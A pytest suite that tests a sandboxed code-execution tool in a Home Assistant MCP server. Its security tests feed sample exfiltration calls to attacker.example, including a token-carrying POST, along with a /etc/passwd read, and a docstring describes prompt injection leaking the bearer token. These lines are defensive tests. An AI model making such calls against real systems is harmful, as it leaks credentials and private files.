"""
End-to-End tests for ha_manage_custom_tool (sandboxed code execution).

This test suite validates:
- Feature flag behavior (disabled by default, enabled with ENABLE_CODE_MODE)
- Basic sandbox code execution and result return
- call_tool bridge to existing MCP tools
- Sandbox security constraints (no filesystem, no classes, recursive self-call)
- Resource limit enforcement (timeout)
- Input validation (empty code, empty justification, save_as format)
- Saved tools lifecycle (save, run, list, overwrite)

Feature Flag: Set ENABLE_CODE_MODE=true to enable.
"""

import logging
import os

import pytest

from ..utilities.assertions import safe_call_tool

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

FEATURE_FLAG = "ENABLE_CODE_MODE"
TOOL_NAME = "ha_manage_custom_tool"


@pytest.fixture(scope="module")
def code_mode_enabled(ha_container_with_fresh_config):
    """Enable code mode feature flag for the test module."""
    old_val = os.environ.get(FEATURE_FLAG)
    os.environ[FEATURE_FLAG] = "true"
    # Reset cached settings so the new server reads the fresh env var
    import ha_mcp.config

    ha_mcp.config._settings = None
    logger.info("Code mode feature flag enabled")
    yield
    if old_val is not None:
        os.environ[FEATURE_FLAG] = old_val
    else:
        os.environ.pop(FEATURE_FLAG, None)
    ha_mcp.config._settings = None


@pytest.fixture(scope="module")
async def _code_mode_server(code_mode_enabled, ha_container_with_fresh_config):
    """Create a single MCP server with code mode enabled for the module."""
    from ha_mcp.client.rest_client import HomeAssistantClient
    from ha_mcp.server import HomeAssistantSmartMCPServer
    from tests.test_constants import TEST_TOKEN

    container_info = ha_container_with_fresh_config
    base_url = container_info["base_url"]
    client = HomeAssistantClient(base_url=base_url, token=TEST_TOKEN)
    server = HomeAssistantSmartMCPServer(client=client)
    yield server


@pytest.fixture
async def mcp_client_with_code_mode(_code_mode_server):
    """Create MCP client connected to the code-mode-enabled server."""
    from fastmcp import Client

    mcp_client = Client(_code_mode_server.mcp)
    async with mcp_client:
        logger.debug("FastMCP client with code mode connected")
        yield mcp_client


async def _check_tool_available(mcp_client) -> tuple[bool, str | None]:
    """Check if ha_manage_custom_tool is available in the MCP server."""
    try:
        tools = await mcp_client.list_tools()
        tool_names = [t.name for t in tools]
        if TOOL_NAME not in tool_names:
            return False, f"Tool {TOOL_NAME} not registered"
        return True, None
    except Exception as e:
        return False, f"Error checking tools: {e}"


def _skip_if_unavailable(result: tuple[bool, str | None], test_name: str):
    available, error = result
    if not available:
        pytest.skip(f"{test_name}: {error}")


# ---------------------------------------------------------------------------
# Feature flag / registration
# ---------------------------------------------------------------------------


class TestCodeModeAvailability:
    """Test ha_manage_custom_tool availability and feature flag behavior."""

    async def test_feature_flag_disabled_by_default(
        self, ha_container_with_fresh_config
    ):
        """Verify tool is NOT registered when feature flag is disabled."""
        # Ensure flag is OFF for this test
        original = os.environ.pop(FEATURE_FLAG, None)
        try:
            # Reset cached settings singleton so server reads fresh env
            import ha_mcp.config

            ha_mcp.config._settings = None

            from ha_mcp.server import HomeAssistantSmartMCPServer

            server = HomeAssistantSmartMCPServer(
                client=None,
                server_name="test-disabled",
            )

            from fastmcp import Client

            client = Client(server.mcp)
            async with client:
                tools = await client.list_tools()
                tool_names = [t.name for t in tools]
                assert TOOL_NAME not in tool_names, (
                    f"Tool should NOT be registered when flag is off, "
                    f"but found in: {tool_names}"
                )
                logger.info("Correctly: tool not registered when flag disabled")
        finally:
            if original:
                os.environ[FEATURE_FLAG] = original
            ha_mcp.config._settings = None  # Reset for other tests

    async def test_tool_registered_when_enabled(self, mcp_client_with_code_mode):
        """Verify tool IS registered when feature flag is enabled."""
        available, error = await _check_tool_available(mcp_client_with_code_mode)
        assert available, f"Tool should be registered: {error}"
        logger.info("ha_manage_custom_tool is registered and available")


# ---------------------------------------------------------------------------
# Input validation
# ---------------------------------------------------------------------------


class TestCodeModeValidation:
    """Test input validation for ha_manage_custom_tool."""

    async def test_empty_code_rejected(self, mcp_client_with_code_mode):
        """Empty code with no mode set must be rejected."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Empty code validation")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "", "justification": "testing empty code"},
        )
        assert data.get("success") is False, f"Empty code should fail: {data}"
        logger.info("Correctly rejected empty code")

    async def test_whitespace_code_rejected(self, mcp_client_with_code_mode):
        """Whitespace-only code must be rejected."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Whitespace code validation")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "   \n  ", "justification": "testing whitespace code"},
        )
        assert data.get("success") is False, f"Whitespace code should fail: {data}"
        logger.info("Correctly rejected whitespace-only code")

    async def test_empty_justification_rejected(self, mcp_client_with_code_mode):
        """Empty justification must be rejected when code is provided."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Empty justification validation")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "42", "justification": ""},
        )
        assert data.get("success") is False, f"Empty justification should fail: {data}"
        logger.info("Correctly rejected empty justification")

    async def test_invalid_save_as_rejected(self, mcp_client_with_code_mode):
        """Invalid save_as names must be rejected."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Invalid save_as validation")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "42",
                "justification": "test",
                "save_as": "../../bad-name!",
            },
        )
        assert data.get("success") is False, f"Bad save_as should fail: {data}"
        logger.info("Correctly rejected invalid save_as name")

    async def test_no_mode_specified(self, mcp_client_with_code_mode):
        """Calling with no code, no run_saved, no list_saved must error."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "No mode specified")

        data = await safe_call_tool(mcp_client_with_code_mode, TOOL_NAME, {})
        assert data.get("success") is False, f"No mode should fail: {data}"
        logger.info("Correctly rejected no-mode call")

    async def test_modes_mutually_exclusive_code_and_run_saved(
        self, mcp_client_with_code_mode
    ):
        """Specifying both code and run_saved must be rejected."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Mode mutex code+run_saved")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "42",
                "justification": "test",
                "run_saved": "any_name",
            },
        )
        assert data.get("success") is False, (
            f"code + run_saved must be rejected: {data}"
        )
        logger.info("Correctly rejected code + run_saved combination")

    async def test_modes_mutually_exclusive_code_and_list_saved(
        self, mcp_client_with_code_mode
    ):
        """Specifying both code and list_saved must be rejected."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Mode mutex code+list_saved")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "42",
                "justification": "test",
                "list_saved": True,
            },
        )
        assert data.get("success") is False, (
            f"code + list_saved must be rejected: {data}"
        )
        logger.info("Correctly rejected code + list_saved combination")

    async def test_modes_mutually_exclusive_run_saved_and_list_saved(
        self, mcp_client_with_code_mode
    ):
        """Specifying both run_saved and list_saved must be rejected."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Mode mutex run_saved+list_saved")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "run_saved": "any_name",
                "list_saved": True,
            },
        )
        assert data.get("success") is False, (
            f"run_saved + list_saved must be rejected: {data}"
        )
        logger.info("Correctly rejected run_saved + list_saved combination")


# ---------------------------------------------------------------------------
# Basic execution
# ---------------------------------------------------------------------------


class TestCodeModeExecution:
    """Test basic sandbox code execution."""

    async def test_simple_expression(self, mcp_client_with_code_mode):
        """Simple expression returns its value."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Simple expression")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "2 + 2", "justification": "E2E test: simple arithmetic"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        assert data["data"]["result"] == 4, f"2+2 should equal 4: {data}"
        logger.info("Simple expression returned correct result")

    async def test_dict_result(self, mcp_client_with_code_mode):
        """Code returning a dict works correctly."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Dict result")

        code = 'items = [1, 2, 3, 4, 5]\n{"total": sum(items), "count": len(items)}'
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: dict return value"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert result["total"] == 15, f"Sum should be 15: {data}"
        assert result["count"] == 5, f"Count should be 5: {data}"
        logger.info("Dict result returned correctly")

    async def test_justification_in_response(self, mcp_client_with_code_mode):
        """Justification is nested inside data in the response."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Justification in response")

        justification = "E2E test: verify justification passthrough"
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "'hello'", "justification": justification},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        assert data["data"]["justification"] == justification, (
            f"Justification should be in data: {data}"
        )
        logger.info("Justification correctly included in response")


# ---------------------------------------------------------------------------
# call_tool bridge
# ---------------------------------------------------------------------------


class TestCodeModeCallTool:
    """Test call_tool bridge to existing MCP tools."""

    async def test_call_tool_get_overview(self, mcp_client_with_code_mode):
        """call_tool can invoke ha_get_overview."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "call_tool bridge")

        code = 'result = await call_tool("ha_get_overview", {})\nresult.get("success", False)'
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: call_tool bridge"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        logger.info("call_tool bridge successfully invoked ha_get_overview")

    async def test_call_tool_search_entities(self, mcp_client_with_code_mode):
        """call_tool can invoke ha_search_entities and return results."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "call_tool search")

        # ha_search_entities wraps results with add_timezone_metadata, so
        # the shape is {"data": {"success": True, "results": [...]}, "metadata": {...}}.
        # Unwrap the "data" layer first, then access "results".
        code = (
            'result = await call_tool("ha_search_entities", '
            '{"query": "light", "limit": 5})\n'
            'data = result.get("data", result)\n'
            'results = data.get("results", [])\n'
            '{"found": len(results) > 0, "count": len(results)}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: call_tool search"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert result["found"] is True, f"Should find entities: {data}"
        logger.info("call_tool bridge searched entities (found %d)", result["count"])

    async def test_call_tool_error_returns_dict(self, mcp_client_with_code_mode):
        """call_tool returns error dict (not exception) when tool fails."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "call_tool error handling")

        code = (
            'result = await call_tool("ha_get_state", '
            '{"entity_id": "nonexistent.entity_12345"})\n'
            'result.get("success", "missing")'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: call_tool error handling"},
        )
        assert data.get("success") is True, (
            f"Sandbox should succeed even when inner tool fails: {data}"
        )
        assert data["data"]["result"] is False, (
            f"Inner tool should return success=False: {data}"
        )
        logger.info("call_tool correctly returned error dict for failed tool")

    async def test_call_tool_nonexistent_tool(self, mcp_client_with_code_mode):
        """call_tool with nonexistent tool returns error dict."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "call_tool nonexistent tool")

        code = (
            'result = await call_tool("ha_nonexistent_tool_xyz", {})\n'
            'result.get("success", "missing")'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: nonexistent tool"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        assert data["data"]["result"] is False, (
            f"Nonexistent tool should return success=False: {data}"
        )
        logger.info("call_tool correctly handled nonexistent tool")


# ---------------------------------------------------------------------------
# Direct HA API access (api_get / api_post)
# ---------------------------------------------------------------------------


class TestCodeModeApiAccess:
    """Test direct HA REST API access from sandbox."""

    async def test_api_get_config(self, mcp_client_with_code_mode):
        """api_get can fetch HA config."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get config")

        code = (
            'result = await api_get("/config")\n'
            '{"has_version": "version" in result, "location": result.get("location_name", "")}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_get direct HA access"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_version"] is True, f"Should have version in config: {data}"
        logger.info("api_get successfully fetched HA config")

    async def test_api_get_states(self, mcp_client_with_code_mode):
        """api_get can fetch all entity states directly."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get states")

        code = (
            'states = await api_get("/states")\n'
            '{"count": len(states), "has_entities": len(states) > 0}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_get states"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_entities"] is True, f"Should find entities: {data}"
        logger.info("api_get fetched %d entity states", result["count"])

    async def test_api_post_service(self, mcp_client_with_code_mode):
        """api_post can call a HA service directly."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post service")

        # Call homeassistant.check_config — a safe, read-only service
        code = (
            'result = await api_post("/services/homeassistant/check_config")\n'
            "isinstance(result, (dict, list))"
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_post service call"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        logger.info("api_post successfully called HA service")

    async def test_api_get_invalid_endpoint(self, mcp_client_with_code_mode):
        """api_get with nonexistent endpoint returns error dict, not exception."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get invalid endpoint")

        code = (
            'result = await api_get("/nonexistent_endpoint_xyz")\n'
            '{"has_error": "error" in str(result) or "message" in str(result),'
            ' "type": str(type(result))}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_get error handling"},
        )
        # Sandbox should succeed — the api_get returns error data, not exception
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        logger.info("api_get correctly returned error for invalid endpoint")

    async def test_api_post_with_data(self, mcp_client_with_code_mode):
        """api_post can send a JSON data payload."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post with data")

        # Render a simple Jinja2 template via the template API
        code = (
            'result = await api_post("/template", {"template": "{{ 40 + 2 }}"})\nresult'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_post with data payload"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        # Template API returns the rendered string "42"
        assert "42" in str(data["data"]["result"]), (
            f"Template should render to 42: {data}"
        )
        logger.info("api_post successfully sent data payload")

    async def test_api_get_specific_entity_state(self, mcp_client_with_code_mode):
        """api_get can fetch a specific entity state by endpoint."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get entity state")

        # sun.sun exists in all HA instances with default_config.
        # api_get returns a dict (JSON parsed) — verify entity_id is present.
        code = (
            'result = await api_get("/states/sun.sun")\n'
            '{"entity_id": str(result.get("entity_id", "")), '
            '"state": str(result.get("state", ""))} '
            'if isinstance(result, dict) else {"raw": str(result)[:200]}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_get specific entity"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert "entity_id" in result or "raw" in result, (
            f"Should have entity_id or raw: {data}"
        )
        logger.info("api_get fetched specific entity state: %s", result)


# ---------------------------------------------------------------------------
# Direct HA WebSocket access (ws_send)
# ---------------------------------------------------------------------------


class TestCodeModeWebSocket:
    """Test direct HA WebSocket access from sandbox."""

    async def test_ws_send_area_registry_list(self, mcp_client_with_code_mode):
        """ws_send can list areas via the area_registry/list WS command.

        Asserts the returned items have the area-registry shape so the test
        would catch a regression where ws_send returns an empty list or the
        wrong WS endpoint.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send area registry list")

        # Return the first element's keys so the assertion can verify shape,
        # not just count. ``area_id`` and ``name`` are required by HA's area
        # registry contract — their presence proves we hit the right command.
        code = (
            'result = await ws_send({"type": "config/area_registry/list"})\n'
            'areas = result.get("result", result if isinstance(result, list) else [])\n'
            "first_keys = sorted(areas[0].keys()) if isinstance(areas, list) and areas "
            "and isinstance(areas[0], dict) else []\n"
            '{"count": len(areas) if isinstance(areas, list) else 0,'
            ' "is_list": isinstance(areas, list),'
            ' "first_keys": first_keys}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: ws_send area registry list"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert result["is_list"] is True, f"Areas should be a list: {data}"
        # The fresh-config fixture seeds at least one area; if not we'd be
        # asserting against empty registry which is a meaningful failure too.
        assert result["count"] > 0, (
            f"Expected at least one area in fresh config: {data}"
        )
        assert "area_id" in result["first_keys"], (
            f"area_registry/list response should contain area_id: {result}"
        )
        assert "name" in result["first_keys"], (
            f"area_registry/list response should contain name: {result}"
        )
        logger.info("ws_send fetched %d areas with expected shape", result["count"])

    async def test_ws_send_render_template(self, mcp_client_with_code_mode):
        """ws_send can render a Jinja2 template via the WS render_template command."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send render_template")

        # Verify exact equality on the rendered result (string "42") rather
        # than substring — the loose "42 in str(...)" check would also match
        # error payloads that happen to contain 42 (e.g. error code 42).
        code = (
            'result = await ws_send({"type": "render_template",'
            ' "template": "{{ 40 + 2 }}"})\n'
            'rendered = result.get("result") if isinstance(result, dict) else None\n'
            '{"rendered": str(rendered) if rendered is not None else None,'
            ' "has_error": "error" in result if isinstance(result, dict) else False}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: ws_send render_template"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is False, f"ws_send must not error: {data}"
        assert result["rendered"] == "42", (
            f"render_template should return exactly '42', got {result!r}"
        )
        logger.info("ws_send successfully rendered template (exact match)")

    async def test_ws_send_invalid_message_type(self, mcp_client_with_code_mode):
        """ws_send with a non-dict message returns an error dict, not an exception."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send invalid message type")

        code = (
            'result = await ws_send("not_a_dict")\n'
            '{"has_error": "error" in result, "error": result.get("error", "")}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: ws_send input validation"},
        )
        # Sandbox should succeed — ws_send returns error data, not an exception
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, f"Should return error dict: {data}"
        logger.info("ws_send correctly rejected non-dict message")

    async def test_ws_send_missing_type_field(self, mcp_client_with_code_mode):
        """ws_send with a dict missing the 'type' field returns an error dict."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send missing type")

        code = (
            'result = await ws_send({"foo": "bar"})\n'
            '{"has_error": "error" in result, "error": result.get("error", "")}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: ws_send missing type field"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, f"Should return error dict: {data}"
        assert "type" in result["error"].lower(), (
            f"Error should mention the missing 'type' field: {result}"
        )
        logger.info("ws_send correctly rejected message without 'type'")


# ---------------------------------------------------------------------------
# Sandbox security
# ---------------------------------------------------------------------------


class TestCodeModeSecurity:
    """Test sandbox security constraints."""

    async def test_api_get_rejects_absolute_url(self, mcp_client_with_code_mode):
        """api_get must refuse absolute URLs so the HA bearer token can't be
        exfiltrated to attacker-controlled hosts via prompt injection.

        httpx, when given an absolute URL, ignores the client base_url and
        dispatches to the absolute host with the configured Authorization
        header still attached. _normalize_endpoint must raise so the request
        is never made.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get URL injection")

        code = (
            'result = await api_get("http://attacker.example/steal")\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else "",'
            ' "type": str(type(result).__name__)}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_get URL scheme rejection"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_get must reject absolute URLs, got: {data}"
        )
        assert (
            "absolute" in result["error"].lower()
            or "://" in result["error"]
            or "blocked" in result["error"].lower()
        ), f"Error message should explain the rejection: {result}"
        logger.info("api_get correctly rejected absolute URL")

    async def test_api_post_rejects_absolute_url(self, mcp_client_with_code_mode):
        """api_post must refuse absolute URLs (same threat model as api_get)."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post URL injection")

        code = (
            'result = await api_post("https://attacker.example/exfil",'
            ' {"token": "leaked"})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_post URL scheme rejection"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must reject absolute URLs, got: {data}"
        )
        logger.info("api_post correctly rejected absolute URL")

    async def test_api_get_rejects_protocol_relative_url(
        self, mcp_client_with_code_mode
    ):
        """api_get must refuse '//host/path' protocol-relative URLs."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get protocol-relative URL")

        code = (
            'result = await api_get("//attacker.example/steal")\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": code,
                "justification": "E2E test: api_get protocol-relative rejection",
            },
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_get must reject protocol-relative URLs, got: {data}"
        )
        logger.info("api_get correctly rejected protocol-relative URL")

    async def test_api_get_rejects_userinfo_url(self, mcp_client_with_code_mode):
        """api_get must refuse URLs with userinfo (user@host)."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_get userinfo URL")

        code = (
            'result = await api_get("user@attacker.example/path")\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: api_get userinfo rejection"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_get must reject userinfo URLs, got: {data}"
        )
        logger.info("api_get correctly rejected userinfo URL")

    async def test_no_filesystem_access(self, mcp_client_with_code_mode):
        """Sandbox must block filesystem access."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "No filesystem access")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "open('/etc/passwd').read()",
                "justification": "E2E test: verify filesystem blocked",
            },
        )
        assert data.get("success") is False, (
            f"Filesystem access should be blocked: {data}"
        )
        error_details = str(data.get("error", ""))
        assert (
            "open" in error_details.lower()
            or "not defined" in error_details.lower()
            or "sandbox" in error_details.lower()
        ), f"Error should mention the sandbox violation, got: {error_details}"
        logger.info("Correctly blocked filesystem access")

    async def test_no_class_definitions(self, mcp_client_with_code_mode):
        """Sandbox must block class definitions."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "No class definitions")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "class Foo:\n    pass\nFoo()",
                "justification": "E2E test: verify class definitions blocked",
            },
        )
        assert data.get("success") is False, (
            f"Class definitions should be blocked: {data}"
        )
        error_details = str(data.get("error", ""))
        assert "class" in error_details.lower() or "syntax" in error_details.lower(), (
            f"Error should mention class/syntax violation, got: {error_details}"
        )
        logger.info("Correctly blocked class definitions")

    async def test_syntax_error_handled(self, mcp_client_with_code_mode):
        """Syntax errors return structured error, not crash."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Syntax error handling")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "def foo(:\n  pass",
                "justification": "E2E test: syntax error handling",
            },
        )
        assert data.get("success") is False, (
            f"Syntax error should return failure: {data}"
        )
        error_details = str(data.get("error", ""))
        assert "syntax" in error_details.lower() or "parse" in error_details.lower(), (
            f"Error should mention syntax, got: {error_details}"
        )
        logger.info("Correctly handled syntax error")

    async def test_recursive_self_call_blocked(self, mcp_client_with_code_mode):
        """Sandbox code must not be able to call ha_manage_custom_tool recursively."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Recursive self-call")

        code = (
            'result = await call_tool("ha_manage_custom_tool", '
            '{"code": "1+1", "justification": "nested"})\n'
            "result"
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: recursive self-call"},
        )
        assert data.get("success") is True, (
            f"Sandbox should succeed (blocked call returns error dict): {data}"
        )
        result = data["data"]["result"]
        assert result.get("success") is False, (
            f"Recursive call should be blocked: {result}"
        )
        assert "cannot be called" in result.get("error", {}).get("message", ""), (
            f"Should explain why blocked: {result}"
        )
        logger.info("Correctly blocked recursive self-invocation")


# ---------------------------------------------------------------------------
# Resource limits
# ---------------------------------------------------------------------------


class TestCodeModeResourceLimits:
    """Test resource limit enforcement."""

    async def test_timeout_enforced(self, mcp_client_with_code_mode):
        """Code that exceeds the time limit is terminated."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Timeout enforcement")

        code = "i = 0\nwhile True:\n    i += 1\ni"
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: timeout enforcement"},
        )
        assert data.get("success") is False, (
            f"Infinite loop should be terminated: {data}"
        )
        error_details = str(data.get("error", ""))
        assert (
            "duration" in error_details.lower()
            or "time" in error_details.lower()
            or "limit" in error_details.lower()
        ), f"Error should mention timeout/duration, got: {error_details}"
        logger.info("Correctly terminated code that exceeded time limit")


# ---------------------------------------------------------------------------
# Saved tools
# ---------------------------------------------------------------------------


class TestSavedTools:
    """Test save/run/list workflow for custom tools."""

    async def test_save_and_run(self, mcp_client_with_code_mode):
        """Save a tool via save_as, then re-run it via run_saved."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Save and run")

        # Create and save
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "40 + 2",
                "justification": "E2E test: save and rerun",
                "save_as": "e2e_answer",
            },
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        assert data["data"]["result"] == 42, f"Should return 42: {data}"
        assert data["data"].get("saved_as") == "e2e_answer", (
            f"Should confirm save: {data}"
        )

        # Re-run saved tool
        data2 = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"run_saved": "e2e_answer"},
        )
        assert data2.get("success") is True, f"Re-run should succeed: {data2}"
        assert data2["data"]["result"] == 42, f"Re-run should return 42: {data2}"
        assert data2["data"]["saved_tool"] == "e2e_answer", (
            f"Should reference saved tool: {data2}"
        )
        logger.info("Save and re-run workflow works correctly")

    async def test_overwrite_saved_tool(self, mcp_client_with_code_mode):
        """Saving with the same name overwrites the previous tool."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Overwrite saved tool")

        # Save v1
        await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "1", "justification": "v1", "save_as": "e2e_overwrite"},
        )

        # Save v2 with same name
        await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": "2", "justification": "v2", "save_as": "e2e_overwrite"},
        )

        # Run — should get v2
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"run_saved": "e2e_overwrite"},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        assert data["data"]["result"] == 2, f"Should run v2 (overwritten), got: {data}"
        logger.info("Overwrite correctly replaced saved tool")

    async def test_list_saved_tools(self, mcp_client_with_code_mode):
        """list_saved=True returns saved tools nested under data.saved_tools.

        The shape is intentionally ``data.saved_tools[name]`` rather than
        ``data[name]`` because saved-tool names share the namespace with
        keys used by the *other* response shapes (``result``,
        ``saved_tool``, ``count``, ``code``, ``justification``). Without
